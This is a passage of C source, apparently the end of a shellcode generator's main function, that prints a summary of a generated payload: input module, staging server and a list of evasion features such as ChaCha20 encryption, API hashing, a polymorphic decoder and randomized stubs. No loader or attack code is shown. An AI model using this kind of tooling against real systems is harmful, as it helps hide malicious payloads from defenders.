          printf("    Server      " C_WHT "%s" C_RST "\n", c.server);
        }
        printf("\n");

        printf(C_YEL "  PROTECTIONS" C_RST "\n");
        printf("    Encryption  " C_WHT "ChaCha20" C_RST "\n");
        printf("    API Hashing " C_WHT "Maru" C_RST "\n");
        printf("    PE Headers  " C_WHT "%s" C_RST "\n", headers_str);
        printf("    Exec Guard  " C_WHT "%s" C_RST "\n", c.chunked ? "VEH sliding window + per-page encrypt" : "RW->RX");
        printf("    Decoder     " C_WHT "Polymorphic XOR" C_RST "\n");
        printf("    PEB Access  " C_WHT "Direct gs:[0x60]" C_RST "\n");
        if(c.decoy[0]) printf("    Decoy       " C_WHT "%s" C_RST "\n", c.decoy);
        printf("    PEB Walk    " C_WHT "Randomized" C_RST "\n");
        printf("    Entry Stub  " C_WHT "Randomized" C_RST "\n");
        printf("    Padding     " C_WHT "Randomized" C_RST "\n");
      } else {
        printf("  SUCCESS: Shellcode generated.\n\n");

        printf("  INPUT\n");
        printf("    File        %s\n", c.input);
        printf("    Type        %s\n", mod_type);
        printf("    Compressed  aPLib (-%"PRId32"%%)\n", file_diff(c.zlen, c.len));
        if(c.mod_type == FRITTER_MODULE_NET_DLL) {
          printf("    Class       %s\n", c.cls);
          printf("    Method      %s\n", c.method);
          printf("    Domain      %s\n", c.domain[0] ? c.domain : "Default");
        } else if(c.mod_type == FRITTER_MODULE_DLL) {
          printf("    Function    %s\n", c.method[0] ? c.method : "DllMain");
        }
        if(c.args[0]) printf("    Arguments   %s\n", c.args);
        printf("\n");

        printf("  OUTPUT\n");
        printf("    Shellcode   %s\n", c.output);
        printf("    Instance    %s\n", inst_type[c.inst_type - 1]);
        printf("    Arch        %s\n", arch_str);
        printf("    Exit        %s\n", exit_str);
        if(c.oep) printf("    OEP         0x%"PRIX32"\n", c.oep);
        if(c.inst_type == FRITTER_INSTANCE_HTTP) {
          printf("    Module      %s\n", c.modname);
          printf("    Server      %s\n", c.server);
        }
        printf("\n");

        printf("  PROTECTIONS\n");
        printf("    Encryption  ChaCha20\n");
        printf("    API Hashing Maru\n");
        printf("    PE Headers  %s\n", headers_str);
        printf("    Exec Guard  %s\n", c.chunked ? "VEH sliding window + per-page encrypt" : "RW->RX");
        printf("    Decoder     Polymorphic XOR\n");
        printf("    PEB Access  Direct gs:[0x60]\n");
        if(c.decoy[0]) printf("    Decoy       %s\n", c.decoy);
        printf("    PEB Walk    Randomized\n");
        printf("    Entry Stub  Randomized\n");
        printf("    Padding     Randomized\n");
      }
    }
    printf("\n");
    FritterDelete(&c);
    return 0;
}
#endif

